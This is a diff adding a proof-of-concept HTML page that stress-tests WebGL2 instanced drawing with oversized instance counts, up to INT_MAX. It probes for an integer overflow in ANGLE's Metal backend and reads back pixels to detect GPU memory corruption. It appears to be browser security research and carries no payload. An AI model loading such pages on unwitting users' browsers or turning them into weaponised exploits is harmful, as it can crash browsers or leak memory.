@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC6: Instanced Draw Stress - ANGLE Metal Integer Overflow</title></head>
+<body>
+<canvas id="c" width="256" height="256"></canvas>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  console.log('[POC6] ' + msg);
+}
+
+function getError(gl) {
+  const errs = [];
+  let e;
+  while ((e = gl.getError()) !== gl.NO_ERROR) errs.push('0x' + e.toString(16));
+  return errs.length ? errs.join(',') : 'none';
+}
+
+async function run() {
+  const canvas = document.getElementById('c');
+  const gl = canvas.getContext('webgl2');
+  if (!gl) { log('FAIL: No WebGL2'); return; }
+  log('Renderer: ' + gl.getParameter(gl.RENDERER));
+
+  // Shader with per-instance attribute
+  const vs = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs, `#version 300 es
+    in vec4 aPosition;
+    in vec4 aInstanceOffset;
+    flat out int vInstanceID;
+    void main() {
+      gl_Position = aPosition + aInstanceOffset;
+      vInstanceID = gl_InstanceID;
+    }`);
+  gl.compileShader(vs);
+
+  const fs = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs, `#version 300 es
+    precision mediump float;
+    flat in int vInstanceID;
+    out vec4 fragColor;
+    void main() {
+      fragColor = vec4(float(vInstanceID & 0xFF) / 255.0, 0.0, 0.0, 1.0);
+    }`);
+  gl.compileShader(fs);
+
+  const prog = gl.createProgram();
+  gl.attachShader(prog, vs);
+  gl.attachShader(prog, fs);
+  gl.linkProgram(prog);
+  if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
+    log('Link error: ' + gl.getProgramInfoLog(prog));
+    return;
+  }
+  gl.useProgram(prog);
+
+  // Vertex buffer: small triangle
+  const vbo = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, vbo);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+    0, 0.01, 0, 1,  -0.01, -0.01, 0, 1,  0.01, -0.01, 0, 1
+  ]), gl.STATIC_DRAW);
+  const posLoc = gl.getAttribLocation(prog, 'aPosition');
+  gl.enableVertexAttribArray(posLoc);
+  gl.vertexAttribPointer(posLoc, 4, gl.FLOAT, false, 0, 0);
+
+  // Instance buffer: very small (only 4 instances worth of data)
+  const instBuf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, instBuf);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+    0, 0, 0, 0,
+    0.1, 0, 0, 0,
+    0.2, 0, 0, 0,
+    0.3, 0, 0, 0,
+  ]), gl.STATIC_DRAW);
+  const instLoc = gl.getAttribLocation(prog, 'aInstanceOffset');
+  gl.enableVertexAttribArray(instLoc);
+  gl.vertexAttribPointer(instLoc, 4, gl.FLOAT, false, 0, 0);
+  gl.vertexAttribDivisor(instLoc, 1);
+
+  getError(gl); // clear
+
+  // Test: Draw with instance count that exceeds instance buffer
+  // The instance buffer has 4 instances. What happens if we draw many more?
+  log('\n--- Test: Instance count exceeding buffer ---');
+  const testCounts = [
+    4,        // Exact match
+    5,        // 1 more than buffer
+    100,      // Way more
+    10000,    // Much more
+    1000000,  // Million
+    0x7FFFFFFF, // INT_MAX
+  ];
+
+  for (const count of testCounts) {
+    try {
+      gl.drawArraysInstanced(gl.TRIANGLES, 0, 3, count);
+      const err = getError(gl);
+      log('drawArraysInstanced count=' + count + ': error=' + err);
+      gl.finish();
+      log('  finish() completed');
+    } catch(e) {
+      log('count=' + count + ': EXCEPTION: ' + e.message);
+    }
+  }
+
+  // Test 2: Same with drawElementsInstanced
+  log('\n--- Test 2: drawElementsInstanced exceeding buffer ---');
+  const ibo = gl.createBuffer();
+  gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, ibo);
+  gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array([0, 1, 2]), gl.STATIC_DRAW);
+
+  for (const count of testCounts) {
+    try {
+      gl.drawElementsInstanced(gl.TRIANGLES, 3, gl.UNSIGNED_SHORT, 0, count);
+      const err = getError(gl);
+      log('drawElementsInstanced count=' + count + ': error=' + err);
+      gl.finish();
+    } catch(e) {
+      log('count=' + count + ': EXCEPTION: ' + e.message);
+    }
+  }
+
+  // Test 3: multiDraw with mixed instance counts
+  log('\n--- Test 3: multiDraw with mixed counts ---');
+  const multiDraw = gl.getExtension('WEBGL_multi_draw');
+  if (multiDraw) {
+    const firstArray = new Int32Array([0, 0, 0]);
+    const countArray = new Int32Array([3, 3, 3]);
+    const instanceArray = new Int32Array([1, 0x7FFFFFFF, 1]);
+
+    try {
+      multiDraw.multiDrawArraysInstancedWEBGL(
+        gl.TRIANGLES, firstArray, 0, countArray, 0, instanceArray, 0, 3);
+      log('multiDraw mixed instances: error=' + getError(gl));
+      gl.finish();
+      log('  finish() ok');
+    } catch(e) {
+      log('multiDraw: EXCEPTION: ' + e.message);
+    }
+
+    // With element draw
+    const offsetArray = new Int32Array([0, 0, 0]);
+    try {
+      multiDraw.multiDrawElementsInstancedWEBGL(
+        gl.TRIANGLES, countArray, 0, gl.UNSIGNED_SHORT, offsetArray, 0, instanceArray, 0, 3);
+      log('multiDrawElements mixed instances: error=' + getError(gl));
+      gl.finish();
+    } catch(e) {
+      log('multiDrawElements: EXCEPTION: ' + e.message);
+    }
+  }
+
+  // Test 4: Read pixels after these draws to check for GPU corruption
+  log('\n--- Test 4: readPixels after instanced stress ---');
+  const pixels = new Uint8Array(256 * 256 * 4);
+  gl.readPixels(0, 0, 256, 256, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+  
+  let nonZero = 0;
+  for (let i = 0; i < pixels.length; i++) {
+    if (pixels[i] !== 0) nonZero++;
+  }
+  log('Non-zero pixel bytes: ' + nonZero + '/' + pixels.length);
+  log('error=' + getError(gl));
+
+  log('\n=== PoC6 Complete ===');
+}
+
+run().catch(e => log('FATAL: ' + e.message + '\n' + e.stack));
+</script>
+</body>
+</html>
